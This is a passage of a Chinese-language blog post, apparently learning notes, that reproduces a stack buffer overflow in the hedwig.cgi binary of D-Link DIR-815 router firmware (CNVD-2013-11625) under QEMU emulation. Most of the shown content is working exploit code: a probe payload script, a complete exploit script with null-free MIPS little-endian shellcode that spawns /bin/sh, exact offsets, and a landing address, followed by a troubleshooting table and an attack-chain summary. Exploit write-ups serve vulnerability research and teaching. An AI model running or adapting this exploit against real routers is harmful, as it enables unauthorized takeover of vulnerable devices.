+<p>shellcode 紧跟在 <code>$ra</code> 后面放。函数 <code>jr $ra</code> 时延迟槽 <code>addiu $sp, $sp, 0x450</code> 执行完，<code>$sp</code> 正好指向 <code>$ra</code> 之后的数据 → <strong>shellcode 地址 = 崩溃时的 <code>$sp</code></strong>。</p>
+<p>发一个探针 payload（<code>$ra</code> 填 <code>BBBB</code>，shellcode 位置放 <code>E</code> 占位）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">python3 - &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">R   = <span class="string">&quot;/home/nexlvi/CTFer/iot-env/firmware/extractions/DIR815A1_FW103b01.bin.extracted/F008C/squashfs-root&quot;</span></span><br><span class="line">CGI = f<span class="string">&quot;&#123;R&#125;/htdocs/cgibin&quot;</span></span><br><span class="line"></span><br><span class="line">value  = b<span class="string">&quot;A&quot;</span> * 1032</span><br><span class="line">value += b<span class="string">&quot;\x30\xad\x2a\x2b&quot;</span>   <span class="comment"># 偏移1032：合法栈地址 (0x2b2aad30)</span></span><br><span class="line">value += b<span class="string">&quot;C&quot;</span> * 7</span><br><span class="line">value += b<span class="string">&quot;BBBB&quot;</span>                <span class="comment"># $ra 探针</span></span><br><span class="line">value += b<span class="string">&quot;E&quot;</span> * 100             <span class="comment"># shellcode 占位符</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">env</span> = &#123;</span><br><span class="line">    b<span class="string">&quot;HTTP_COOKIE&quot;</span>:    b<span class="string">&quot;uid=&quot;</span> + value,</span><br><span class="line">    b<span class="string">&quot;REQUEST_METHOD&quot;</span>: b<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;CONTENT_LENGTH&quot;</span>: b<span class="string">&quot;0&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;CONTENT_TYPE&quot;</span>:   b<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;REQUEST_URI&quot;</span>:    b<span class="string">&quot;/hedwig.cgi&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;REMOTE_ADDR&quot;</span>:    b<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">subprocess.run([b<span class="string">&quot;qemu-mipsel&quot;</span>, b<span class="string">&quot;-L&quot;</span>, R.encode(), b<span class="string">&quot;-g&quot;</span>, b<span class="string">&quot;1234&quot;</span>,</span><br><span class="line">                b<span class="string">&quot;-0&quot;</span>, b<span class="string">&quot;hedwig.cgi&quot;</span>, CGI.encode()], <span class="built_in">env</span>=<span class="built_in">env</span>)</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>GDB 里崩溃后：</p>
+<p>![[Pasted image 20260807204705.png]]</p>
+<p><strong>SHELLCODE_ADDR = 0x2b2ab880</strong> 📌</p>
+<blockquote>
+<p>⚠️ 这个地址和 payload 大小强相关：QEMU 把所有环境变量压到栈顶，cookie 越大初始 <code>$sp</code> 越低。<strong>必须用与最终 exploit 完全相同大小的 payload 来测 $sp</strong>，否则地址漂移。<br />
+⚠️ 环境变量要<strong>最小化</strong>（只用上面 6 个），不能用 <code>os.environb.copy()</code> 继承父进程全部变量，否则不同终端下 <code>$sp</code> 不一致。</p>
+</blockquote>
+<hr />
+<h2 id="第五步编写-mips-le-shellcode"><a class="markdownIt-Anchor" href="#第五步编写-mips-le-shellcode"></a> 第五步：编写 MIPS LE shellcode</h2>
+<p>目标是 <code>execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], NULL)</code> 的机器码，<strong>且不含 null 字节</strong>（<code>sess_get_uid</code> 用 C 字符串处理 cookie，遇 <code>\x00</code> 就截断）。</p>
+<p>三个坑：</p>
+<ol>
+<li><strong>MIPS 小端字符串陷阱</strong>：<code>sw</code> 是低字节先写低地址，寄存器里要放<strong>翻转后的字节序</strong>。如 <code>/bin</code> = <code>0x2f62696e</code>，寄存器要装 <code>0x6e69622f</code>，<code>sw</code> 后内存才是 <code>2f 62 69 6e</code>。</li>
+<li><strong>构造 0 不能直接 <code>move</code></strong>：<code>move</code>/<code>xor</code> 的机器码含 <code>\x00</code>。用 <code>slti $t6, $zero, -1</code>（有符号比较 <code>0 &lt; -1</code> 为假 → 结果为 0），机器码 <code>0x280effff</code> 无 null 字节。</li>
+<li><strong>argv 数组不能和字符串重叠</strong>：<code>argv[1]</code> 会读到字符串字节当成指针 → execve 返回 EFAULT。字符串放 <code>$sp-24</code>，argv 数组放 <code>$sp-12</code>。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os, subprocess</span><br><span class="line"><span class="keyword">import</span> keystone</span><br><span class="line"></span><br><span class="line">ROOTFS = <span class="string">&quot;/home/nexlvi/CTFer/iot-env/firmware/extractions/DIR815A1_FW103b01.bin.extracted/F008C/squashfs-root&quot;</span></span><br><span class="line">CGI = <span class="string">f&quot;<span class="subst">&#123;ROOTFS&#125;</span>/htdocs/cgibin&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET_PTR     = <span class="number">1032</span></span><br><span class="line">OFFSET_RA      = <span class="number">1043</span></span><br><span class="line">PTR_BYPASS     = <span class="string">b&quot;\x30\xad\x2a\x2b&quot;</span>   <span class="comment"># 0x2b2aad30</span></span><br><span class="line">SHELLCODE_ADDR = <span class="number">0x2b2ab880</span></span><br><span class="line"></span><br><span class="line">ks = keystone.Ks(keystone.KS_ARCH_MIPS, keystone.KS_MODE_MIPS32 + keystone.KS_MODE_LITTLE_ENDIAN)</span><br><span class="line">shellcode = <span class="built_in">bytes</span>(ks.asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    lui   $t6, 0x6e69</span></span><br><span class="line"><span class="string">    ori   $t6, $t6, 0x622f</span></span><br><span class="line"><span class="string">    sw    $t6, -24($sp)</span></span><br><span class="line"><span class="string">    lui   $t6, 0x6873</span></span><br><span class="line"><span class="string">    ori   $t6, $t6, 0x2f2f</span></span><br><span class="line"><span class="string">    sw    $t6, -20($sp)</span></span><br><span class="line"><span class="string">    slti  $t6, $zero, -1</span></span><br><span class="line"><span class="string">    sw    $t6, -16($sp)</span></span><br><span class="line"><span class="string">    addiu $a0, $sp, -24</span></span><br><span class="line"><span class="string">    sw    $a0, -12($sp)</span></span><br><span class="line"><span class="string">    sw    $t6, -8($sp)</span></span><br><span class="line"><span class="string">    addiu $a1, $sp, -12</span></span><br><span class="line"><span class="string">    slti  $a2, $zero, -1</span></span><br><span class="line"><span class="string">    addiu $v0, $zero, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&quot;\x00&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32le</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> v.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value  = <span class="string">b&quot;A&quot;</span> * OFFSET_PTR</span><br><span class="line">value += PTR_BYPASS</span><br><span class="line">value += <span class="string">b&quot;C&quot;</span> * (OFFSET_RA - OFFSET_PTR - <span class="number">4</span>)</span><br><span class="line">value += p32le(SHELLCODE_ADDR)</span><br><span class="line">value += shellcode</span><br><span class="line">value += <span class="string">b&quot;E&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&quot;\x00&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> value</span><br><span class="line"></span><br><span class="line">env = &#123;</span><br><span class="line">    <span class="string">b&quot;HTTP_COOKIE&quot;</span>:   <span class="string">b&quot;uid=&quot;</span> + value,</span><br><span class="line">    <span class="string">b&quot;REQUEST_METHOD&quot;</span>: <span class="string">b&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;CONTENT_LENGTH&quot;</span>: <span class="string">b&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;CONTENT_TYPE&quot;</span>:   <span class="string">b&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;REQUEST_URI&quot;</span>:    <span class="string">b&quot;/hedwig.cgi&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;REMOTE_ADDR&quot;</span>:    <span class="string">b&quot;127.0.0.1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">args = [</span><br><span class="line">    <span class="string">b&quot;qemu-mipsel&quot;</span>, <span class="string">b&quot;-L&quot;</span>, ROOTFS.encode(),</span><br><span class="line">    <span class="string">b&quot;-0&quot;</span>, <span class="string">b&quot;hedwig.cgi&quot;</span>,</span><br><span class="line">    CGI.encode()</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span> bytes, null-free&quot;</span>, file=sys.stderr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] $ra → 0x<span class="subst">&#123;SHELLCODE_ADDR:08x&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Spawning shell... type commands, Ctrl+D to exit&quot;</span>, file=sys.stderr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] First 2 lines are HTTP headers from cgibin, then shell starts.\n&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">subprocess.run(args, env=env)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="pasted-image-20260807205224png"><a class="markdownIt-Anchor" href="#pasted-image-20260807205224png"></a> ![[Pasted image 20260807205224.png]]</h2>
+<h2 id="常见报错与排查"><a class="markdownIt-Anchor" href="#常见报错与排查"></a> 常见报错与排查</h2>
+<table>
+<thead>
+<tr>
+<th>报错</th>
+<th>原因</th>
+<th>解决</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SIGBUS</code></td>
+<td>偏移 1032 处是无效地址，尾声解引用指针先崩</td>
+<td>1032 处填合法栈地址（<code>0x2b2aad30</code>）</td>
+</tr>
+<tr>
+<td><code>SIGILL</code></td>
+<td>跳到了 shellcode 地址但内容不对（地址偏了）</td>
+<td><code>x/10i 0x2b2ab880</code> 看是不是自己的指令；用<strong>完整 payload</strong> 重测 $sp</td>
+</tr>
+<tr>
+<td><code>-E HTTP_COOKIE=...: invalid option</code> / cookie 被截断</td>
+<td>QEMU <code>-E</code> 按逗号分隔，shellcode 含 <code>0x2c</code></td>
+<td>改用 Python <code>env=</code> 字典传环境变量</td>
+</tr>
+<tr>
+<td><code>$sp</code> 每次运行不一样</td>
+<td>用了 <code>os.environb.copy()</code>，环境变量数量/大小不定</td>
+<td>只用 6 个最小化环境变量</td>
+</tr>
+<tr>
+<td>execve 后无输出（exit=0）</td>
+<td>shell 起来了但命令没发进去</td>
+<td>换交互式版本手动输入验证</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
+<p>完整攻击链：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DIR815A1_FW103b01.bin</span><br><span class="line">  → binwalk 解包 → htdocs/cgibin（MIPS32 LE，无 NX/Canary/PIE，stripped）</span><br><span class="line">  → IDA 定位 hedwigcgi_main：sprintf(buf[1024], uid) 无长度限制</span><br><span class="line">  → QEMU user-mode + GDB：cyclic 定位 $ra 偏移 1043，发现 1032 指针陷阱</span><br><span class="line">  → 实测崩溃 $sp = 0x2b2ab880 作为 shellcode 落点</span><br><span class="line">  → keystone 汇编 60 字节 null-free execve(&quot;/bin//sh&quot;) shellcode</span><br><span class="line">  → 构造 1211 字节 cookie → subprocess env 传参 → Getshell</span><br></pre></td></tr></table></figure>
+<p>这个洞能成立，本质是三层叠加：</p>
+<ol>
+<li><strong>代码层</strong>：<code>sprintf</code> 无长度限制，C 语言经典错误（应换 <code>snprintf</code>）；</li>
+<li><strong>编译层</strong>：无 canary、无 NX，栈上直接执行，2013 年嵌入式固件的常态；</li>
+<li><strong>运行层</strong>：QEMU user-mode 关 ASLR + 无 PIE，地址可预测，利用难度大幅下降。</li>
+</ol>
+<p>最后，感谢师傅们能看到这</p>
+<hr />
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-289036.htm">https://bbs.kanxue.com/thread-289036.htm</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17924">https://xz.aliyun.com/news/17924</a></li>
+<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm">https://bbs.kanxue.com/thread-272318.htm</a></li>
+</ul>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>本文作者：</strong>Nexlvi</p>
+    <p><strong><span class="icon-link icon"></span>本文链接：</strong><a href="https://nexlvi.github.io/2026/05/20/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://nexlvi.github.io/2026/05/20/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+    
+    
+    
+    <p><strong><span class="icon-copyright icon"></span>本文版权：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> 许可协议。转载请注明出处！</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag" title="IOT">IOT</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag" title="学习笔记">学习笔记</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/photo.jpg" data-sizes="auto" alt="Hexo 博客写作指南" class="lazyload">
+      <a href="/2026/05/20/hello-world/" aria-label="后一篇: Hexo 博客写作指南"  title="后一篇: Hexo 博客写作指南"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          Hexo 博客写作指南
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      Nexlvi
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        3.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:17
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E8%A7%A3%E5%8C%85%E5%9B%BA%E4%BB%B6%E6%89%BE%E5%88%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.</span> <span class="toc-text"> 第一步：解包固件，找到文件系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BD%A0%E9%9C%80%E8%A6%81%E6%8F%90%E5%89%8D%E8%A3%85%E5%A5%BD%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text"> 0. 你需要提前装好的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E4%B8%8B%E8%BD%BD%E5%9B%BA%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text"> 1.1 下载固件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E7%94%A8-binwalk-%E8%A7%A3%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text"> 1.2 用 binwalk 解包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text"> 第二步：找到漏洞所在的文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E4%BB%8E-http-%E5%85%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E6%89%BE"><span class="toc-number">2.1.</span> <span class="toc-text"> 2.1 从 HTTP 入口开始找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%A1%AE%E8%AE%A4-cgibin-%E7%9A%84%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8A%E4%BF%9D%E6%8A%A4"><span class="toc-number">2.2.</span> <span class="toc-text"> 2.2 确认 cgibin 的架构以及保护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5gdb-%E8%B0%83%E8%AF%95%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB"><span class="toc-number">3.</span> <span class="toc-text"> 第三步：GDB 调试，精确定位偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E7%94%A8-de-bruijn-%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8D-ra-%E5%81%8F%E7%A7%BB"><span class="toc-number">3.1.</span> <span class="toc-text"> 3.1 用 De Bruijn 序列定位 $ra 偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%81%8F%E7%A7%BB-1032-%E7%9A%84%E9%99%B7%E9%98%B1sigbus"><span class="toc-number">3.2.</span> <span class="toc-text"> 3.2 偏移 1032 的陷阱：SIGBUS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%E7%A1%AE%E8%AE%A4%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E6%89%BE-shellcode-%E8%90%BD%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text"> 第四步：确认内存布局，找 shellcode 落点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%90%84%E6%AE%B5%E5%8A%A0%E8%BD%BD%E5%9C%A8%E5%93%AA"><span class="toc-number">4.1.</span> <span class="toc-text"> 4.1 各段加载在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%8E%A2%E9%92%88-payload-%E5%AE%9E%E6%B5%8B-shellcode-%E8%90%BD%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text"> 4.2 探针 payload 实测 shellcode 落点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%E7%BC%96%E5%86%99-mips-le-shellcode"><span class="toc-number">5.</span> <span class="toc-text"> 第五步：编写 MIPS LE shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pasted-image-20260807205224png"><span class="toc-number">6.</span> <span class="toc-text"> ![[Pasted image 20260807205224.png]]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E4%B8%8E%E6%8E%92%E6%9F%A5"><span class="toc-number">7.</span> <span class="toc-text"> 常见报错与排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text"> 参考</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/Nexlvi.jpg" data-sizes="auto" alt="Nexlvi" class="lazyload">
+  <div class="sidebar-author-name">Nexlvi</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Nexlvi/ itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/491457782 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-qq sidebar-social-icon">
+      <a href=2896275217 itemprop="url" target="_blank" aria-label="qq" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Nexlvi",
+          title: "DIR-815漏洞复现",
+          url: "https://nexlvi.github.io/2026/05/20/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: " 漏洞编号：CNVD-2013-11625 目标固件：DIR815A1_FW103b01.bin（D-Link DIR-815 Rev.A 1.03b01） 架构：MIPS32 Little Endian 复现方式：QEMU user-mode 本地仿真，无需真实路由器   第一步：解包固件，找到文件系统  0. 你需要提前装好的工具 笔者这里使用的是arch linux，下载可根据自身系统调整 12345# Arch Linuxsudo pacman -S qemu-user qemu-use",
+          date: "Wed May 20 2026 19:29:06 GMT+0800",
+          updated: "Fri Aug 07 2026 21:51:10 GMT+0800",
+          cover: "/images/dir.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
